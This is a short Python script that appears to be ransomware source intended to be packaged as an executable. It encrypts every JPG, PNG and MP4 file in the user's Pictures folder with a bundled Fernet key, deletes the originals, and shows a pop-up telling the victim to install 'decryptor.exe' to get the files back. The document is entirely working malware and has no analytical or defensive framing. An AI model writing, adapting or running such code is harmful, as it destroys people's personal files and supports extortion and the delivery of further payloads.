import os
from cryptography.fernet import Fernet
from pathlib import Path

# Load key bundled into EXE
key = b"YOUR_REPLACEABLE_KEY"
f = Fernet(key)

def lock_files():
    home = Path.home() / "Pictures"
    for ext in ("*.jpg", "*.png", "*.mp4"):
        for file in home.glob(ext):
            with open(file, "rb") as original:
                data = original.read()
            token = f.encrypt(data)
            with open(str(file) + ".shredded", "wb") as locked:
                locked.write(token)
            os.remove(file)

if __name__ == "__main__":
    lock_files()
    os.system('msg * "Your files are locked! Install decryptor.exe to recover."')
